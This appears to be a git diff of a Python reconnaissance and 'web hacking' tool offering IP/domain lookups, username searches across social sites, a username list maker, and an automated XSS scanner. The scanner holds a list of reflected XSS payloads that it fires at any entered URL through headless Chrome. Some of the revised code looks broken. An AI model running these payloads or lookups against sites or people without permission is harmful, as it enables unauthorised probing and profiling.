@@ -5,214 +5,271 @@ from urllib.parse import urlparse
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.alert import Alert
-from bs4 import BeautifulSoup
+import bs4
 from itertools import cycle
 timeout = 12
 def ip():
-    try:
-        ip = input('[Info IP] ip >> ')
-        addr = ip
-        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}
-        ip = "https://www.whatismyip.com/%s/"%(ip)
-        rec = requests.get(ip,headers=h)
-        rec = BeautifulSoup(rec.content,'lxml')
-        render = re.findall(r"list-group-item..(.*)<", str(rec))
-        print('''                              Information Of %s
-        %s
-        %s
-        %s\n
-                                ISP information of %s\n
-                                
-        %s
-        %s
-        %s
-        '''%(addr,render[0],render[1],render[2],addr,render[5],render[6],render[7]))
-    except:
-        print('sorry i dont found anything !! ')
-def findbyemail():
-    try:
-        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}
-        email = input("[Info Email] Email >> ")
-        addr = email
-        address = 'https://website.informer.com/email/%s'%(email)
-        rec = requests.get(address,headers=h)
-        rec = BeautifulSoup(rec.content,'lxml')
-        render = re.findall(r"/(.*)..More info",str(rec))
-        rendername = re.findall(r"keepre-site-e.....(.*? .*? )",str(rec))
-        emcheck = re.findall(r"@(.*)",email)
-        if emcheck[0] in render:
-            render.remove(emcheck[0])
-        else:
-            pass
-        print('\ninformation of %s'%(addr))
-        print('\nReal Name => %s'%(rendername[0]))
-        a = 1
-        for site in render:
-            print("%s => %s"%(a,site))
-            a += 1
-        if a == 10:
-            print("├ %s has more than 10 sites."%(addr))
-        else:
-            pass
-    except:
-        print('sorry i dont found anything ! ')
+    ip = input("[Info IP] IP => ")
+    headers = {
+        'Host': 'www.infobyip.com',
+        'Content-Length': '38',
+        'Cache-Control': 'max-age=0',
+        'Sec-Ch-Ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
+        'Sec-Ch-Ua-Mobile': '?0',
+        'Sec-Ch-Ua-Platform': '"Windows"',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+        'Origin': 'https://www.infobyip.com',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-User': '?1',
+        'Sec-Fetch-Dest': 'document',
+        'Referer': 'https://www.infobyip.com/ipwhois-185.192.112.81.html',
+        'Accept-Language': 'en-US,en;q=0.9,fa-IR;q=0.8,fa;q=0.7,ru-RU;q=0.6,ru;q=0.5,pt;q=0.4',
+        'Dnt': '1',
+        'Sec-Gpc': '1',
+    }
+    cookies = {
+        '_ga': 'GA1.1.1191056851.1699119863',
+        'w3ad': '0',
+        'w3ad1length': '0',
+        '_ga_FEQ5C4GK3T': 'GS1.1.1169519862.1.1.1699120188.60.0.0',
+    }
+    data = {
+        'ip': ip,
+        'tool': 'ipwhois',
+        '_p1': '2100',
+    }
+    response = requests.post(
+        'https://www.infobyip.com/ipwhois-185.192.112.81.html',
+        cookies=cookies,
+        headers=headers,
+        data=data,
+        verify=True,
+    )
+    url = "https://www.infobyip.com/ipwhois-185.192.112.81.html"
+    request = requests.post(url, headers=headers, data=data)
+    render = bs4.BeautifulSoup(request.content,'lxml')
+    regex = re.findall(r'(inetnum.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n.*\n)',str(render))
+    regex = re.split('\n',regex[0])
+    print('\n')
+    for i in regex:
+        print('[+] ',i)
+
 def whois():
     try:
-        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}
-        print("Without http:// and https://")
-        site = input("[Info Domain] Url >> ")
-        backup = site
-        try:
-            newsite = re.findall(r"/.(.*)",site)
-            newsite = newsite[0]
-        except:
-            newsite = site
-        site = ("https://website.informer.com/%s"%(newsite))
-        rec = requests.get(site,headers=h)
-        rec = BeautifulSoup(rec.content,'lxml')
-        spltnew = newsite.split('.')
-        subdom = re.findall(r"href=\"/(.*?)\"",str(rec))
-        a = 1
-        cn = len(subdom)
-        print("\n       ┌ Subdomains of %s"%backup,'\n')
-        for i in range(a,cn):
-            if ('.'+spltnew[-1]) not in subdom[i]:
-                pass
-            elif '/emails' in subdom[i] :
-                pass
-            elif newsite not in subdom[i]:
-                pass
-            else:
-                print('             ├ %s'%(subdom[i]))
-        ips = re.findall(r"<a href=\"/(\d*.\d*.\d*.\d*)\"",str(rec))
-        print("\n       ┌ IP Adresses\n")
-        lenip = len(ips)
-        a = 0
-        for i in range(a,lenip):
-            print("             ├ IP => %s"%(ips[i]))
-        owner = re.findall(r"<a href=\".*\">(.*?)<",str(rec))
-        owner = owner[3]
-        print('\n       ├ Hosting Service of %s => %s'%(backup,owner))
-        emailfind = ("https://website.informer.com/%s/emails"%(newsite))
-        rec2 = requests.get(emailfind,headers=h)
-        rec2 = BeautifulSoup(rec2.content,'lxml')
-        emails = re.findall(r"/email/(.*)\"",str(rec2))
-        cw = len(emails)
-        b = 0
-        print('\n       ┌ Owner Emails of %s'%(backup),'\n')
-        for i in range(b,cw):
-            if '@' not in emails[i] :
-                pass
-            else:
-                print("             ├",emails[i])
+        web = input("example : google.com\n[Info Domain] Domain => ")
+        cookies = {
+            'ncmp.domain': 'nslookup.io',
+            'cto_bundle': 'm1n8Il84QVhPaTMxMGJXTnJXVndMeFAlMkJ4aW44alglMkJLZ4x3dnpaWTZNRlRJZXdOb1M5TmtJJTJGMUtXNEVaOTl1Mlpha2g1a2ZrM7YyM2trNTl3OXhid1R1JTJCcVdrMFcyVTZieTdFaG1VMHJ4JTJCZVJ2aXNyTTA0U2Q4VHNMTzclMkZKcyUyRnRkR3QlMkJ0OEhMbHdISVolMkZOVloycHY4VThtb2clM0QlM0Q',
+            'na-unifiedid': '%7B%22TDID%22%3A%22d67c432f-512d-41c9-bb71-a67996280197%22%2C%22TDID_LOOKUP%22%3A%22TRUE%22%2C%22TDID_CREATED_AT%22%3A%282023-10-09T10%3A55%3A49%22%7D',
+            'na-unifiedid_cst': 'TyylLI8srA%3D%3D',
+        }
+
+        headers = {
+            'Host': 'www.nslookup.io',
+            'Content-Length': '45',
+            'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.105 Safari/537.36',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Origin': 'https://www.nslookup.io',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Dest': 'empty',
+            'Referer': 'https://www.nslookup.io/domains/spgc.ir/dns-records/',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Priority': 'u=1, i',
+            'Cookie': 'ncmp.domain=nslookup.io; cto_bundle=m6n8Il81QVhPaTMxMGJXTnJXVndMeFAlMkJ3aW64alglMkJLZ2x9dnpaWTZNRlRJZXdOb1M5TmtJJTJGMUtXNEVaOTl1Mlpha2g1a2ZrM2YyM2trNTl3OXhid1R1JTJCcVdrMFcyVTZieTdFaG1VMHJ4JTJCZVJ2aXNyTTA0U2Q4VHNMTzclMkZKcyUyRnRkR3QlMkJ0OEhMbHdISVolMkZOVloycHY4VThtb2clM0QlM0Q; na-unifiedid=%7B%22TDID%22%3A%22d67c432f-512d-41c9-bb71-a67096280197%22%2C%22TDID_LOOKUP%22%3A%22TRUE%22%2C%22TDID_CREATED_AT%22%3A%222023-10-09T10%3A55%3A49%22%7D; na-unifiedid_cst=TyylLI8srA%3D%3D',
+        }
+
+        json_data = {
+            'domain': web,
+            'dnsServer': 'cloudflare',
+        }
+
+        response = requests.post('https://www.nslookup.io/api/v1/records', cookies=cookies, headers=headers, json=json_data, verify=True)
+        render = bs4.BeautifulSoup(response.content,'lxml')
+        render = re.findall(r'(.raw.*?false)',str(render))
+        render = re.split(',',str(render))
+        print('\n')
+        render0 = render[0]
+        print("[+] IP -> ", render0[9:-1])
+        render1 = render[1]
+        print("[+] Domain -> ", render1[8:-2])
+        render7 = render[7]
+        print("[+] Country -> ", render7[11:-1])
+        render8 = render[8]
+        print("[+] Region -> ", render8[14:-1])
+        render9 = render[9]
+        print("[+] City -> ", render9[8:-1])
+        render12 = render[12]
+        print("[+] Company -> ", render12[7:-1])
+        render13 = render[13]
+        print("[+] AS -> ", render13[6:-1])
+        render14 = render[14]
+        print("[+] AS Name -> ", render14[10:-1])
+        render15 = render[15]
+        print("[+] AS Domain -> ", render15[12:-1])
+        render37 = render[-37]
+        print("[+] MX -> ", render37[10:-3])
+        render19 = render[-19].replace('\\','')
+        print("[+] Admin -> ", render19[9:-2])
+        render20 = render[-20]
+        print("[+] NS -> ", render20[8:-2])
     except:
         print("sorry i dont found anything ! ")
 def socialfinder():
-    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}
-    username = input("[Info Username] Username => ")
-    i = True
-    while i == True:
-        try:
-            error = "Sorry"
-            site = "https://www.reddit.com/user/%s"
-            site = (site%(username))
-            rec = requests.get(site,headers=h,timeout=timeout).text
-            if error in rec:
-                pass
-            else:
-                print("[+] %s"%(site))
-            error = "Following"
-            site = "https://www.picuki.com/profile/%s"
-            site = (site%(username))
-            rec = requests.get(site,headers=h,timeout=timeout)
-            site = ("https://www.instagram.com/%s"%(username))
-            if error or 'Profile is private.' in rec.text:
-                print("[+] %s"%(site))
-            else:
-                pass
-            error = "Sorry, this user was not found."
-            site = "https://www.ebay.com/usr/%s"
-            site = (site%(username))
-            rec = requests.get(site,headers=h,timeout=timeout).text
-            if error in rec:
-                pass
-            else:
-                print("[+] %s"%(site))
-            error = "404 Not Found"
-            site = "https://vk.com/%s"
-            site = (site%(username))
-            rec = requests.get(site,headers=h,timeout=timeout).text
-            if error in rec:
-                pass
-            else:
-                print("[+] %s"%(site))
-            error = "There is no global account for"
-            site = "https://meta.wikimedia.org/wiki/Special:CentralAuth/%s"
-            site = (site%(username))
-            rec = requests.get(site,headers=h,timeout=timeout).text
-            if error in rec:
-                pass
-            else:
-                print("[+] %s"%(site))
-            error = ('@'+username)
-            site = "https://pinterest.com/%s"
-            site = (site%(username))
-            rec = requests.get(site,headers=h,timeout=timeout).text
-            if error in rec:
-                print("[+] %s"%(site))
-            else:
-                pass
-            error = ('@'+username)
-            site = "https://profiles.wordpress.org/%s"
-            site = (site%(username))
-            rec = requests.get(site,headers=h,timeout=timeout).text
-            if error in rec:
-                print("[+] %s"%(site))
-            else:
-                pass
-            error = "The specified profile could not be found."
-            site = "https://steamcommunity.com/id/%s"
-            site = (site%(username))
-            rec = requests.get(site,headers=h,timeout=timeout).text
-            if error in rec:
-                pass
-            else:
-                print("[+] %s"%(site))
-            error = "Not Found"
-            site = "https://github.com/%s"
-            site = (site%(username))
-            rec = requests.get(site,headers=h,timeout=timeout).text
-            if error in rec:
-                pass
-            else:
-                print("[+] %s"%(site))
-            error = "Follow"
-            site = "https://www.anime-planet.com/users/%s"
-            site = (site%(username))
-            rec = requests.get(site,headers=h,timeout=timeout).text
-            if error in rec:
-                print("[+] %s"%(site))
-            else:
-                pass
-            error = "Anime Stats"
-            site = "https://myanimelist.net/profile/%s"
-            site = (site%(username))
-            rec = requests.get(site,headers=h,timeout=timeout).text
-            if error in rec:
-                print("[+] %s"%(site))
-            else:
-                pass
-            error = ('@'+username)
-            site = "https://myanimelist.net/profile/%s"
-            site = (site%(username))
-            rec = requests.get(site,headers=h,timeout=timeout).text
-            if error in rec:
-                print("[+] %s"%(site))
-            else:
-                pass
-        except:
-            print("connection issues...\n")
-            i = False
+
+    id = input("[Social Finder] ID => ")
+
+    headers = {
+        'Host': 'github.com',
+        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
+        'Sec-Ch-Ua-Mobile': '?0',
+        'Sec-Ch-Ua-Platform': '"Windows"',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-User': '?1',
+        'Sec-Fetch-Dest': 'document',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Priority': 'u=0, i',
+        'Connection': 'close',
+    }
+    try:
+        response = requests.get('https://github.com/'+id, headers=headers, verify=True)
+    except:
+        print("Check your Connection.")
+    if response.status_code == 200:
+        print("[+] Github Detected : github.com/"+id)
+    else:
+        None
+    headers = {
+    'Host': 'www.instagram.com',
+    'Dpr': '1.25',
+    'Viewport-Width': '1038',
+    'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
+    'Sec-Ch-Ua-Mobile': '?0',
+    'Sec-Ch-Ua-Platform': '"Windows"',
+    'Sec-Ch-Ua-Platform-Version': '""',
+    'Sec-Ch-Ua-Model': '""',
+    'Sec-Ch-Prefers-Color-Scheme': 'dark',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Sec-Fetch-Site': 'none',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Priority': 'u=0, i',
+    }
+    try:
+        response = requests.get('https://www.instagram.com/'+id,headers=headers, verify=True)
+        response = bs4.BeautifulSoup(response.content,"lxml")
+        response = re.findall(r"<title>(.*)<",str(response))
+    except:
+        print("Check Your Connection.")
+
+    if response[0] == "Instagram":
+        None
+    else:
+        print("[+] Instagram Detected : instagram.com/"+id)
+    
+    headers = {
+    'Host': 'www.reddit.com',
+    'Cache-Control': 'max-age=0',
+    'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
+    'Sec-Ch-Ua-Mobile': '?0',
+    'Sec-Ch-Ua-Platform': '"Windows"',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Sec-Fetch-Site': 'none',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Priority': 'u=0, i',
+    }
+    check = []
+    try:
+        response = requests.get('https://www.reddit.com/user/'+id, headers=headers, verify=True)
+        response = bs4.BeautifulSoup(response.content,'lxml')
+        response = re.findall(r"(shreddit-forbidden not_found)",str(response))
+        response.append("hi")
+    except:
+        print("Check Your Connection.")
+    try:
+        if response[0] == 'hi':
+            print("[+] Reddit Detected : reddit.com/user/"+id)
+    except:
+        None
+    
+    headers = {
+    'Host': 'steamcommunity.com',
+    'Cache-Control': 'max-age=0',
+    'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
+    'Sec-Ch-Ua-Mobile': '?0',
+    'Sec-Ch-Ua-Platform': '"Windows"',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Sec-Fetch-Site': 'none',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Priority': 'u=0, i',
+    'Connection': 'close',
+    }
+    response = ''
+    try:
+        response = requests.get('https://steamcommunity.com/id/'+id, headers=headers, verify=True)
+        response = bs4.BeautifulSoup(response.content,'lxml')
+        response = re.findall(r"(webui_config)",str(response))
+    except:
+        print("Check your Connection.")
+    try:
+        if response[0] == 'webui_config':
+            print("[+] Steam Detected : steamcommunity.com/id/"+id)
+    except:
+        None
+    
+    headers = {
+    'Host': 't.me',
+    'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
+    'Sec-Ch-Ua-Mobile': '?0',
+    'Sec-Ch-Ua-Platform': '"Windows"',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'Sec-Fetch-Site': 'none',
+    'Sec-Fetch-Mode': 'navigate',
+    'Sec-Fetch-User': '?1',
+    'Sec-Fetch-Dest': 'document',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'Priority': 'u=0, i',
+    }
+    response = ''
+    try:
+        response = requests.get('https://t.me/'+id, headers=headers, verify=True)
+        response = bs4.BeautifulSoup(response.content,'lxml')
+        response = re.findall(r"(tgme_page_title)",str(response))
+    except:
+        print("Check your Connection.")
+    try:
+        if response[0] == "tgme_page_title":
+            print("[+] Telegram Detected : t.me/"+id)
+    except:
+        None
 
 def idcreate():
     fname = input("[Username list Maker] Name =>> ")
@@ -250,44 +307,54 @@ def idcreate():
     except:
         print("Error in names . . . !")
 def xss():
-    def weburl():
-        # test : http://www.sudo.co.il/xss/level0.php?email=
+    # test : http://www.sudo.co.il/xss/level0.php?email=
 
-        logging.getLogger('selenium.webdriver').disabled = True
-        options = Options()
-        options.add_argument("--headless")
-        options.add_argument("--disable-gpu")
+    logging.getLogger('selenium.webdriver').disabled = True
 
-        def has_alert(url):
-            driver.get(url)
+    # Set Chrome options for headless browsing
+    chrome_options = Options()
+    chrome_options.add_argument("--headless")
+    chrome_options.add_argument("--disable-gpu")
 
-            try:
-                alert = Alert(driver)
-                alert.accept()
-                return True
-            except:
-                return False
-            
-        payloads = ['"autofocus%2Fonfocus%3D"confirm%26%2340%3Bdocument.domain%26%2341%3B#',"\\'-alert(1);//",'<script>alert(1)</script>','" autofocus="" onfocus="alert(1)','<img src="javascript:alert(1)">','<svg onload="alert(1)"></svg>','<iframe src="javascript:alert(1)"></iframe>','<a href="javascript:alert(1)">Click me</a>','#<script>alert(1)</script>',"';this[8680439..toString(30)](1);'","'};this[8680439..toString(30)](1);{'",'"};this[8680439..toString(30)](1);//','" autofocus="" onfocus="alert(1)',"\\'-alert(1);<!--","'-alert(1)-'",'"autofocus/onfocus="confirm&#40;1&#41;','"autofocus/onfocus="alert(1)','\\"-alert(1)}//',"<b onmouseover=alert(1)>click me</b>","{{{constructor.constructor(1)()}}}",'<video><source onerror="alert(1)"></video>','<style/onload=alert(1)>']
-        url = input("Enter The URL for XSS Checks ==> ")
-        urls = []
-        cunt = 0
+    # List of XSS payloads
+    payloads = ['"autofocus%2Fonfocus%3D"confirm%26%2340%3Bdocument.domain%26%2341%3B#',"\\'-alert(1);//",'<script>alert(1)</script>','" autofocus="" onfocus="alert(1)','<img src="javascript:alert(1)">','<svg onload="alert(1)"></svg>','<iframe src="javascript:alert(1)"></iframe>','<a href="javascript:alert(1)">Click me</a>','#<script>alert(1)</script>',"';this[8680439..toString(30)](1);'","'};this[8680439..toString(30)](1);{'",'"};this[8680439..toString(30)](1);//','" autofocus="" onfocus="alert(1)',"\\'-alert(1);<!--","'-alert(1)-'",'"autofocus/onfocus="confirm&#40;1&#41;','"autofocus/onfocus="alert(1)','\\"-alert(1)}//',"<b onmouseover=alert(1)>click me</b>","{{{constructor.constructor(1)()}}}",'<video><source onerror="alert(1)"></video>','<style/onload=alert(1)>']
 
-        for i in payloads:
-            a = url + i
-            urls.append(a)
-        driver = webdriver.Chrome(options=options)
+    def has_alert(url):
+        driver = webdriver.chrome(service=chromeService(ChromeDriverManager().install()),option=chrome_options)
+        driver.get(url)
 
-        for url2 in urls:
-            if has_alert(url2):
-                cunt = cunt + 1
-                print('\n[+] XSS vulnerability found with payload:', url2, '(popup detected)\n')
-            else:
-                print("[-] Testing . . . ")
+        try:
+            alert = Alert(driver)
+            alert.accept()
+            return True
+        except:
+            return False
+        finally:
+            driver.quit()
 
-        print("\n [*] Total XSS vulnerability has founded : " , cunt)
-        driver.quit()
-    weburl()
+    def perform_xss_checks(url):
+        print("Performing XSS checks on:", url, "\n")
+        vulnerabilities = []
+
+        for payload in payloads:
+            url_with_payload = url + payload
+            if has_alert(url_with_payload):
+                vulnerabilities.append((url_with_payload, payload))
+
+        print("\n[X] XSS vulnerabilities found:\n")
+        if vulnerabilities:
+            for vuln_url, vuln_payload in vulnerabilities:
+                print("URL:", vuln_url)
+                print("Payload:", vuln_payload)
+                print("-" * 50)
+        else:
+            print("No XSS vulnerabilities detected.")
+
+    # Prompt the user to enter the target URL for XSS checks
+    target_url = input("Enter the URL for XSS checks: ")
+    perform_xss_checks(target_url)
+
+
 def DL():
     #example : https://hls.gsfc.nasa.gov/
     #example : https://dutraincorporacoes.com.br/
@@ -389,13 +456,12 @@ print('''
           {   {  }  }       [*] Information Gathering
            }   }{  {           [1] Info IP
           {  }{  }  }          [2] Info Domain
-         ( }{ }{  { )          [3] Info Email (find domains with email)
-        .-{   }   }-.          [4] Username list Maker
-       ( ( } { } { } )         [5] Info Username
+        .-{   }   }-.          [3] Username list Maker
+       ( ( } { } { } )         [4] Info Username
        |`-.._____..-'|      [*] Web Hacking
-       |             ;--.     [6] XSS (url base)
-       |   (__)     (__  \\   [7] Directory Listing Finder
-       |   (oo)      | )  )  [8] Exit
+       |             ;--.     [5] XSS (url base)
+       |   (__)     (__  \\   [6] Directory Listing Finder
+       |   (oo)      | )  )  [0] Exit
        |    \/       |/  /
        |             /  /    
        |            (  /
